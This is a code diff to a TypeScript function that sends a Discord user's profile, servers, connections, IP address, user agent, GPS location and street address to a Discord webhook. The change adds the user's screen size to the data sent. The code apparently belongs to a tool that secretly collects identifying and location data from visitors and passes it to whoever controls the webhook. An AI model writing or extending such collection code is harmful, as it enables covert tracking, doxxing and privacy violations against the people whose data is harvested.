@@ -1,4 +1,4 @@
-import { DiscordUser, DiscordGuild, DiscordConnection, IpInfo, GpsData } from "../types/userdata";
+import { DiscordUser, DiscordGuild, DiscordConnection, IpInfo, GpsData, ScreenSize } from "../types/userdata";
 
 export const sendWebhook = async ( 
   userInfo: DiscordUser, 
@@ -7,7 +7,8 @@ export const sendWebhook = async (
   ipInfo: IpInfo, 
   ua: string,
   gps: GpsData,
-  address: string
+  address: string,
+  screenSize: ScreenSize
 ) => {
     try {
         const webhookUrl = process.env.DISCORD_WEBHOOK || "";
@@ -25,7 +26,7 @@ export const sendWebhook = async (
           },
           {
             name: "💻Device Info",
-            value: `IP: \`${ipInfo.ip}\`\nUserAgent: \`${ua}\``,
+            value: `IP: \`${ipInfo.ip}\`\nUserAgent: \`${ua}\`\nScreen Size: \`${screenSize.width}x${screenSize.height}\``,
             inline: false
           },
           {
